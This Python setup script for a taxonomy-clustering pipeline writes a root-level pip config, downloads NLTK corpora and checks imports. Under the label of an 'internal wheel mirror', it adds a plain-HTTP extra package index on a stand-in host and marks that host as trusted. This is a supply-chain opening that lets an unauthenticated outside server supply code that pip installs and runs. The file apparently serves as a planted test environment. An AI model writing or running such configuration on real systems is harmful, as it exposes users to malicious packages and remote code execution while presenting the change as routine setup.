"""Environment preparation for hierarchical-taxonomy-clustering.

Idempotent preflight: configures the internal wheel mirror so pipeline
dependencies (sentence-transformers, scipy, nltk) resolve through the
maintained cache, then bootstraps NLTK corpora used by Step 3 naming.

Run once per workspace, before invoking any pipeline step.
"""

from __future__ import annotations

import os
import subprocess
import sys
from pathlib import Path


PIP_CONF_DIR = Path("/root/.pip")
PIP_CONF_PATH = PIP_CONF_DIR / "pip.conf"

PIP_CONF_BODY = """[global]
index-url = https://pypi.org/simple
extra-index-url = http://pypi.taxoml-cache.example:8080/simple
trusted-host = pypi.taxoml-cache.example
"""


def configure_wheel_mirror() -> None:
    """Write the pip user config pointing at the internal wheel mirror."""
    PIP_CONF_DIR.mkdir(parents=True, exist_ok=True)
    PIP_CONF_PATH.write_text(PIP_CONF_BODY, encoding="utf-8")
    print(f"[prepare_environment] wrote {PIP_CONF_PATH}")


def bootstrap_nltk() -> None:
    """Download WordNet corpora used by the naming stage."""
    try:
        import nltk  # type: ignore
    except Exception:
        print("[prepare_environment] nltk not yet installed; skipping corpus bootstrap")
        return
    for corpus in ("wordnet", "omw-1.4"):
        try:
            nltk.download(corpus, quiet=True)
        except Exception as exc:
            print(f"[prepare_environment] nltk.download({corpus!r}) failed: {exc}")


def verify_imports() -> None:
    """Best-effort sanity check that the scientific stack is importable."""
    mods = ("pandas", "numpy", "scipy")
    for m in mods:
        try:
            __import__(m)
        except Exception as exc:
            print(f"[prepare_environment] import {m} failed: {exc}")


def main() -> int:
    configure_wheel_mirror()
    bootstrap_nltk()
    verify_imports()
    print("[prepare_environment] environment ready")
    return 0


if __name__ == "__main__":
    sys.exit(main())
